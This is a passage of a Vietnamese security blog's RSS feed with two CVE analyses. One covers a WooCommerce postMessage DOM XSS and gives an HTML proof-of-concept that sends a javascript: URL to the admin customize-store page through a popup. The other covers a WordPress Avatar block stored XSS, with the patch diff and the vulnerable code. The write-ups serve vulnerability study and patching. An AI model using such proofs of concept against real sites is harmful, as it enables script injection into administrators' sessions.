id=&amp;#34;openPopup&amp;#34;&amp;gt;Open Popup&amp;lt;/button&amp;gt;&#xA;&#xA;    &amp;lt;script&amp;gt;&#xA;        let popup;&#xA;&#xA;        document.getElementById(&amp;#34;openPopup&amp;#34;).addEventListener(&amp;#34;click&amp;#34;, () =&amp;gt; {&#xA;            // Mở popup&#xA;            popup = window.open(&#xA;                &amp;#34;http://localhost/wp-admin/admin.php?page=wc-admin&amp;amp;path=%2Fcustomize-store&amp;#34;, &#xA;                &amp;#34;popupWindow&amp;#34;,&#xA;                &amp;#34;width=400,height=300&amp;#34;&#xA;            );&#xA;&#xA;            // Chờ popup load xong&#xA;            const interval = setInterval(() =&amp;gt; {&#xA;                if (popup &amp;amp;&amp;amp; !popup.closed) {&#xA;                    // Gửi message&#xA;                    popup.postMessage({ type: &amp;#39;navigate&amp;#39;, url: &amp;#39;javascript:alert(\&amp;#34;phu0c ph4m\&amp;#34;)&amp;#39; }, &amp;#39;*&amp;#39;);&#xA;                    clearInterval(interval);&#xA;                }&#xA;            }, 5000);&#xA;        });&#xA;    &amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Admin truy cập trang web và click &lt;code&gt;Open Popup&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Sau 5s, sự kiện JavaScript được kích hoạt&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/xss2.png&#34;&#xA;    alt=&#34;Sự kiện JavaScript từ popup&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Sự kiện JavaScript từ popup&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Đúng với mô tả CVE.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Popup không thể tự động kích hoạt nếu không có tương tác của người dùng&#xA;{: .prompt-info }&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;Ở đây, ta không thể sử dụng &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; bởi vì &lt;code&gt;X-Frame-Options: SAMEORIGIN&lt;/code&gt; được set trong response =&amp;gt; chỉ khi cùng origin mới nhúng được.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-10-cve-2025-5062/req1.png&#34;&#xA;    alt=&#34;X-Frame-Options: SAMEORIGIN được set trong response&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;X-Frame-Options: SAMEORIGIN được set trong response&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-5062&lt;/strong&gt; trong plugin &lt;strong&gt;WooCommerce &amp;lt;= 9.4.2&lt;/strong&gt; là &lt;strong&gt;PostMessage-based DOM XSS&lt;/strong&gt;. Kẻ tấn công không cần xác thực có thể gửi message độc hại tới trang &lt;strong&gt;customize-store&lt;/strong&gt;, khiến trình duyệt nạn nhân thực thi script. Bản vá &lt;strong&gt;9.4.3&lt;/strong&gt; đã kiểm tra origin, xác thực cấu trúc dữ liệu và whitelist URL trước khi redirect.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;PostMessage-based DOM XSS&lt;/strong&gt; có thể thực thi script khi người dùng tương tác (popup/link).&lt;/li&gt;&#xA;&lt;li&gt;Dữ liệu từ &lt;strong&gt;postMessage&lt;/strong&gt; luôn phải coi là không tin cậy.&lt;/li&gt;&#xA;&lt;li&gt;Luôn &lt;strong&gt;validate origin, kiểm tra cấu trúc dữ liệu và URL&lt;/strong&gt; trước khi redirect.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cập nhật plugin&lt;/strong&gt; lên bản vá mới nhất để ngăn khai thác.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet — PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/woocommerce/vulnerability/wordpress-woocommerce-plugin-9-3-2-9-4-9-4-2-postmessage-based-cross-site-scripting&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WooCommerce &amp;lt;= 9.3.2 and from 9.4 through 9.4.2 — CVE-2025-5062&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-4439 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-09-cve-2024-4439/</link>
      <pubDate>Thu, 09 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-09-cve-2024-4439/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;WordPress Core&lt;/strong&gt; dễ bị &lt;strong&gt;Stored Cross-Site Scripting&lt;/strong&gt; thông qua tên hiển thị người dùng trong &lt;strong&gt;Avatar block&lt;/strong&gt; ở nhiều phiên bản &lt;strong&gt;đến 6.5.2&lt;/strong&gt; do &lt;strong&gt;insufficient output escaping&lt;/strong&gt; trên &lt;strong&gt;display name&lt;/strong&gt;. Điều này cho phép &lt;strong&gt;authenticated attackers&lt;/strong&gt;, có quyền &lt;strong&gt;contributor-level access&lt;/strong&gt; trở lên, &lt;strong&gt;inject arbitrary web scripts&lt;/strong&gt; vào các trang — những script này sẽ &lt;strong&gt;thực thi&lt;/strong&gt; mỗi khi người dùng truy cập trang đã bị chèn. Ngoài ra, nó cũng cho phép &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; &lt;strong&gt;inject arbitrary web scripts&lt;/strong&gt; vào những trang có &lt;strong&gt;comment block&lt;/strong&gt; và hiển thị &lt;strong&gt;comment author&amp;rsquo;s avatar&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-4439&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-4439&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting (XSS)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;6.0 - 6.0.7&lt;/li&gt;&#xA;&lt;li&gt;6.1 - 6.1.5&lt;/li&gt;&#xA;&lt;li&gt;6.2 - 6.2.4&lt;/li&gt;&#xA;&lt;li&gt;6.3 - 6.3.3&lt;/li&gt;&#xA;&lt;li&gt;6.4 - 6.4.3&lt;/li&gt;&#xA;&lt;li&gt;6.5 - 6.5.1&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;6.0.8&lt;/li&gt;&#xA;&lt;li&gt;6.1.6&lt;/li&gt;&#xA;&lt;li&gt;6.2.5&lt;/li&gt;&#xA;&lt;li&gt;6.3.4&lt;/li&gt;&#xA;&lt;li&gt;6.4.4&lt;/li&gt;&#xA;&lt;li&gt;6.5.2&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: 7.2 (High)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor+&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Core versions&lt;/strong&gt;: &lt;strong&gt;6.4.3&lt;/strong&gt; (vulnerable) và &lt;strong&gt;6.4.4&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Trong phiên bản &lt;strong&gt;vulnerable&lt;/strong&gt;, WP Core đã sử dụng &lt;a href=&#34;https://developer.wordpress.org/reference/functions/esc_attr__/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;esc_attr__()&lt;/code&gt;&lt;/a&gt; để dịch chuỗi và escape HTML attribute trước khi hiển thị ra browser, nhưng đã triễn khai sai cách.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$label = &amp;#39;aria-label=&amp;#34;&amp;#39; . sprintf( esc_attr__( &amp;#39;(%s author archive, opens in a new tab)&amp;#39; ), $author_name ) . &amp;#39;&amp;#34;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;esc_attr__()&lt;/code&gt; sau khi dịch chuỗi và escape HTML thì mới đưa vào &lt;code&gt;sprintf()&lt;/code&gt; để chèn biến &lt;code&gt;$author_name&lt;/code&gt; =&amp;gt; &lt;code&gt;$author_name&lt;/code&gt; không được xử lý.&lt;/p&gt;&#xA;&lt;p&gt;Trong phiên bản &lt;strong&gt;patched&lt;/strong&gt;, &lt;code&gt;$author_name&lt;/code&gt; được đưa vào &lt;code&gt;sprintf()&lt;/code&gt; trước và sau đó mới được escape HTML bằng &lt;code&gt;esc_attr()&lt;/code&gt; =&amp;gt; an toàn trước XSS.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$label = &amp;#39;aria-label=&amp;#34;&amp;#39; . esc_attr( sprintf( __( &amp;#39;(%s author archive, opens in a new tab)&amp;#39; ), $author_name ) ) . &amp;#39;&amp;#34;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/dif1.png&#34;&#xA;    alt=&#34;So sánh sự thay đổi giữa bản lỗi và bản vá&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;So sánh sự thay đổi giữa bản lỗi và bản vá&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;function render_block_core_avatar( $attributes, $content, $block ) {&#xA;  // other logic&#xA;  if ( ! isset( $block-&amp;gt;context[&amp;#39;commentId&amp;#39;] ) ) {&#xA;    $author_id   = isset( $attributes[&amp;#39;userId&amp;#39;] ) ? $attributes[&amp;#39;userId&amp;#39;] : get_post_field( &amp;#39;post_author&amp;#39;, $block-&amp;gt;context[&amp;#39;postId&amp;#39;] );&#xA;    $author_name = get_the_author_meta( &amp;#39;display_name&amp;#39;, $author_id );&#xA;    // other logic&#xA;    if ( isset( $attributes[&amp;#39;isLink&amp;#39;] ) &amp;amp;&amp;amp; $attributes[&amp;#39;isLink&amp;#39;] ) {&#xA;      $label = &amp;#39;&amp;#39;;&#xA;      if ( &amp;#39;_blank&amp;#39; === $attributes[&amp;#39;linkTarget&amp;#39;] ) {&#xA;        // translators: %s is the Author name.&#xA;        $label = &amp;#39;aria-label=&amp;#34;&amp;#39; . sprintf( esc_attr__( &amp;#39;(%s author archive, opens in a new tab)&amp;#39; ), $author_name ) . &amp;#39;&amp;#34;&amp;#39;;&#xA;      }&#xA;    }&#xA;  }&#xA;  // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Avatar block&lt;/strong&gt; là 1 block của &lt;strong&gt;Block Editor&lt;/strong&gt; dùng để tạo nội dung cho post hoặc comment trong WordPress.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$author_name&lt;/code&gt; là &lt;code&gt;display_name&lt;/code&gt; của author có &lt;code&gt;$author_id&lt;/code&gt; thuộc về post hiện tại.&lt;/p&gt;&#xA;&lt;p&gt;Nếu đây là post và có link thì &lt;code&gt;$author_name&lt;/code&gt; chứa payload sẽ thêm vào attribute &lt;code&gt;aria-label&lt;/code&gt; và hiển thị ra trình duyệt.&lt;/p&gt;&#xA;&lt;p&gt;Khi truy cập một post bất kỳ, &lt;code&gt;wp()&lt;/code&gt; được gọi là lấy dữ liệu của post đó.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/debug1.png&#34;&#xA;    alt=&#34;Nơi bắt đầu lấy dữ liệu từ post hiện tại&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Nơi bắt đầu lấy dữ liệu từ post hiện tại&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;pre&gt;&lt;code&gt;function wp( $query_vars = &amp;#39;&amp;#39; ) {&#xA;&#x9;global $wp, $wp_query, $wp_the_query;&#xA;&#xA;&#x9;$wp-&amp;gt;main( $query_vars );&#xA;&#xA;&#x9;if ( ! isset( $wp_the_query ) ) {&#xA;&#x9;&#x9;$wp_the_query = $wp_query;&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tại đây &lt;code&gt;$wp_query&lt;/code&gt; mới được tạo và nó sẽ chứa giá trị của &lt;code&gt;wp_post&lt;/code&gt; sau khi query.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function main( $query_args = &amp;#39;&amp;#39; ) {&#xA;  $this-&amp;gt;init();&#xA;&#xA;  $parsed = $this-&amp;gt;parse_request( $query_args );&#xA;&#xA;  if ( $parsed ) {&#xA;    $this-&amp;gt;query_posts();&#xA;    $this-&amp;gt;handle_404();&#xA;    $this-&amp;gt;register_globals();&#xA;  }&#xA;&#xA;  $this-&amp;gt;send_headers();&#xA;&#xA;  do_action_ref_array( &amp;#39;wp&amp;#39;, array( &amp;amp;$this ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;main()&lt;/code&gt; sẽ &lt;code&gt;parse_request&lt;/code&gt; và thực hiện query lấy thông tin post hiện tại bằng &lt;code&gt;query_posts()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/debug2.png&#34;&#xA;    alt=&#34;Lấy thông tin post bằng query_post()&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Lấy thông tin post bằng query_post()&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;$wp_the_query&lt;/code&gt; là đối tượng &lt;strong&gt;WP_Query chính&lt;/strong&gt; của WordPress, còn &lt;code&gt;$wp_query&lt;/code&gt; chỉ đơn giản là một &lt;strong&gt;tham chiếu&lt;/strong&gt; (reference) trỏ đến &lt;code&gt;$wp_the_query&lt;/code&gt;. Vì vậy, khi &lt;code&gt;$wp_the_query&lt;/code&gt; đã được khởi tạo và có dữ liệu, thì &lt;code&gt;$wp_query&lt;/code&gt; cũng sẽ có cùng giá trị.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/debug3.png&#34;&#xA;    alt=&#34;Giá trị tham chiếu của $wp_query&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Giá trị tham chiếu của $wp_query&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Ta có được giá trị post_content:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- wp:avatar {&amp;#34;userId&amp;#34;:2,&amp;#34;isLink&amp;#34;:true,&amp;#34;linkTarget&amp;#34;:&amp;#34;_blank&amp;#34;} /--&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp:avatar&lt;/code&gt; thuộc loại block &lt;code&gt;core/avatar&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;render()&lt;/code&gt; sẽ gọi đến &lt;code&gt;call_user_func()&lt;/code&gt; với callback là &lt;code&gt;render_block_core_avatar()&lt;/code&gt; để lấy HTML của Avatar block rồi trả về cho người dùng.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt;: author name của contributor+&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sink&lt;/strong&gt;: &lt;code&gt;$author_name&lt;/code&gt; được chèn vào attribute 